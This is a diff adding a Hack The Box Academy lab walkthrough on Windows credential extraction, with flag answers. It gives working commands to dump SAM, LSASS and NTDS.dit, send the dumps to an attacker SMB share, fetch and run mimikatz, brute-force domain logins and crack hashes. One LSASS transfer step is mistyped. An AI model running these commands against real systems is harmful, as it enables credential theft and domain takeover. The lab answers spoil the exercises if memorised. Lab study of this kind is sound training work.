@@ -11,6 +11,12 @@
 2. [Remote Password Attacks](#remote-password-attacks)
     1. [Network Services](#network-services)
     2. [Spraying, Stuffing, and Defaults](#spraying-stuffing-and-defaults)
+3. [Extracting Passwords from Windows Systems](#extracting-passwords-from-windows-systems)
+    1. [Attacking SAM, SYSTEM, and SECURITY](#attacking-sam-system-and-security)
+    2. [Attacking LSASS](#attacking-lsass)
+    3. [Attacking Windows Credential Manager](#attacking-windows-credential-manager)
+    4. [Attacking Active Directory and NTDS.dit](#attacking-active-directory-and-ntdsdit)
+    5. [Credential Hunting in Windows](#credential-hunting-in-windows)
 ## Password Cracking Techniques
 
 ### Introduction to Password Cracking
@@ -255,7 +261,7 @@
     Then we login using the credential that we found.
 
     ```bash
-    xfreerdp /v:10.129.202.136 /u:chris /p:789456123
+        xfreerdp /v:10.129.202.136 /u:chris /p:789456123
     ```
     The answer is `HTB{R3m0t3DeskIsw4yT00easy}`.
 
@@ -297,3 +303,279 @@
     creds search MySQL
     ```
     We tried all of that and we get `superdba:admin` as the right answer.
+
+## Extracting Passwords from Windows Systems
+### Attacking SAM, SYSTEM, and SECURITY
+#### Tools
+1. dpapi.py
+2. mimikatz
+3. DonPAPI
+4. netexec 
+
+#### Challenges
+1. Where is the SAM database located in the Windows registry? (Format: ****\***)
+
+    The answer is `HKLM\SAM`.
+
+2. Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer.
+
+    To solve this, first we need rdp to the target. Then we run `cmd` with admin previllege. Then we use `reg.exe` to save `sam,system,security` registry hives.
+
+    ```cmd
+    reg.exe save hklm\sam C:\sam.save
+    reg.exe save hklm\system C:\system.save
+    reg.exe save hklm\security C:\security.save
+    ```
+
+    Then we setup smb to transfer from the attacked host to our host. In our host, we can do this.
+
+    ```bash
+    mkdir ~/loot
+    sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support SHARE ~/loot
+    ```
+
+    Back to attacked host, we transfer all of those.
+
+    ```cmd
+    move sam.save \\10.10.15.234\share 
+    move system.save \\10.10.15.234\share 
+    move security.save \\10.10.15.234\share 
+    ```
+
+    In our host, we can dump the hash using `secretsdump.py`.
+
+    ```bash
+    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+    ```
+
+    ![alt text](Assets/WD1.png)
+
+    In there we can find ITbackdoor user. We copy the fourth component (nthash) to crack using hashcat.
+
+    ```bash
+    sudo hashcat -m 1000 c02478537b9727d391bc80011c2e2321 /usr/share/wordlists/rockyou.txt
+    ```
+
+    The answer is `matrix`.
+
+3.   Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)
+
+    To solve this, we can use entexec.
+
+    ```bash
+    netexec smb 10.129.202.137 --local-auth -u Bob -p HTB_@cademy_stdnt! --lsa
+    ```
+
+    The answer is `frontdesk:Password123`.
+
+### Attacking LSASS
+#### Tools
+1. pypykatz
+#### Challenges 
+1. What is the name of the executable file associated with the Local Security Authority Process?
+
+    The answer is `lsass.exe`.
+
+2. Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case sensitive)
+
+    To solve this, after we xfreerdp to the target, we run this in the powershell.
+
+    ```powershell
+    Get-Process lsass
+    rundll32 C:\windows\system32\comsvcs.dll, MiniDump <Id>> C:\lsass.dmp full
+    ```
+
+    Then we setup for the smb transfer in our machine.
+
+    ```bash
+    mkdir ~/loot
+    sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support SHARE ~/loot
+    ```
+    Back to our attacked machine, we transfer that. 
+    ```powershell
+    sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support SHARE ~/loot
+    ```
+
+    After that, dump the lsa by using pypykatz
+    ```bash
+    pypykatz lsa minidump lsass.dmp
+    ```
+    After we copied the NT from the vendor user, we crack it using hashcat.
+
+    ```bash
+    sudo hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 rockyou.txt
+    ```
+    The answer is `Mic@123`.
+
+### Attacking Windows Credential Manager
+#### Tools
+1. mimikatz.exe
+#### Challenges 
+1. What is the password mcharles uses for OneDrive?
+
+    To solve this, after we xfreerdp to the target, we seacrh stored credentials account in the current user.
+    ```cmd
+    cmdkey /list
+    ```
+    ![alt text](Assets/WD2.png)
+
+    We can see it has `SRV01\mcharles` user. The we check the detail of that user.
+    ```cmd
+    net user mcharles
+    ```
+
+    ![alt text](Assets/WD3.png)
+
+    We can see its part of Administrator group. Then we run new cmd using that credential.
+
+    ```cmd
+    runas /savecred /user:SRV01\mcharles cmd
+    ```
+    To transfer mimkatz from our host to attacked host, i used http server in here. In our host run this.
+
+    ```bash
+    wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
+    python3 -m http.server 8080
+    ```
+    Back to our attacked host, run this to download the file.
+
+    ```cmd
+    powershell -c "Invoke-WebRequest -Uri http://10.10.15.234:8080/mimikatz_trunk.zip -OutFile C:\Users\sadams\Desktop\mimikatz.zip"
+    ```
+    After that, to use mimkatz, we must have admin previllege. So with user in the part of admin group, we start new cmd with run as adminstrator.
+
+    ```cmd
+    powershell -c "Start-Process cmd -Verb RunAs"
+    ```
+    Then run mimikatz. In the mimikatz do this.
+    ```cmd
+    mimikatz # privilege::debug
+    ```
+
+    We cant get the password by doing `sekurlsa::credman`. Because the password is not saved in our current user (mcharles) instead it saved on sadams session. We can use this command `sekurlsa::logonpasswords` to dump all logon session.
+
+    ![alt text](Assets/WD4.png)
+
+    In there we can get the password. The answer is `Inlanefreight#2025`.
+
+### Attacking Active Directory and NTDS.dit
+#### Tools
+1. username-anarchy
+2. Kerbrute
+3. NetExec
+4. evil-winrm
+#### Challenges
+1. What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? (Format: ****.***)
+
+    The answer is `NTDS.dit`.
+
+2. Submit the NT hash associated with the Administrator user from the example output in the section reading.
+
+    The answer is `64f12cddaa88057e06a81b54e73b949b`.
+
+3. On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)
+
+    To solve this, first we must find the correct domain name. We can use nmap to  enumerate ldap (domain controoler) port.
+
+    ```bash
+    nmap --script ldap-rootdse -p 389 10.129.202.85
+    ```
+    ![alt text](Assets/AD1.png)
+
+    Based on that, we can see the correct domain is `ILF.local`. Then we need to find the correct username. We already have informations about the person name. Here the list of that.
+
+    ```bash
+    mrwhok@MSI:~/ctf/HTB-Academy/HTB-Password_Attacks$ cat name.txt
+    John Marston
+    Carol Johnson
+    Jennifer Stapleton
+    ```
+    Then we use `username-anarchy` to make username combination.
+
+    ```bash
+    username-anarchy -i name.txt > users.txt
+    ```
+
+    After that, we use `kerbrute` to find valid username.
+
+    ```bash
+    kerbrute userenum --dc 10.129.202.85 --domain ILF.local users.txt
+    ```
+
+    ![alt text](Assets/AD2.png)
+
+    We can see it have 3 results. For our case, we need to find valid username for `John Marston`. So the valide username based on that is `jmarston`. Then we use `netexec` to bruteforce the password.
+
+    ```bash
+    netexec smb 10.129.202.85 -u jmarston -p /home/mrwhok/tools/fasttrack.txt
+    ```
+
+    We can get the answer for this challenge is `jmarston:P@ssword!`.
+
+4. Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive)
+
+    To solve this, with the credential we found in the previous, we can use `evil-winrm`.
+
+    ```bash
+    evil-winrm -i 10.129.202.85  -u jmarston -p 'P@ssword!'
+    ```
+
+    In the win-rm shell, we can check our group membership. If we have admin, we can do many thing.
+    
+    ```bash
+    net user jmarston
+    ```
+
+    ![alt text](Assets/AD3.png)
+
+    Based on that, we can see it part of admin group. So we can create copy shadow volume c to get NTDS.dit and SYSTEM.
+
+    ```bash
+    vssadmin CREATE SHADOW /For=C:
+    cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+    cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\NTDS\SYSTEM
+    ```
+
+    Then we can download it to our host.
+
+    ```powershell
+    download NTDS.dit
+    download SYSTEM
+    ```
+
+    Then we can use `impacket-secretsdump` to dump the hash.
+
+    ```bash
+    impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
+    ```
+
+    After copy the NT hashes, we can use hashcat to crack it.
+
+    ```bash
+    sudo hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /home/mrwhok/ctf/HTB-Academy/footprinting/rockyou.txt    
+    ```
+    The answer is `Winter2008`.
+
+### Credential Hunting in Windows
+#### Tools
+1. LaZagne
+#### Challenges
+1. What password does Bob use to connect to the Switches via SSH? (Format: Case-Sensitive)
+
+    We can find this in the creds folder. The answer is `WellConnected123`.
+
+2. What is the GitLab access code Bob uses? (Format: Case-Sensitive)
+
+    We can find this in the workstuff folder. The answer is `3z1ePfGbjWPsTfCsZfjy`.
+
+3. What credentials does Bob use with WinSCP to connect to the file server? (Format: username:password, Case-Sensitive)
+
+    We can use lazagne to solve this. The answer is `ubuntu:FSadmin123`.
+
+4. What is the default password of every newly created Inlanefreight Domain user account? (Format: Case-Sensitive)
+
+    We can find this in the BulkadADUsers.txt. The answer is `Inlanefreightisgreat2022`.
+
+5. What are the credentials to access the Edge-Router? (Format: username:password, Case-Sensitive)
+
+    We can find this in the ansible folder. The answer is `edgeadmin:Edge@dmin123!`.
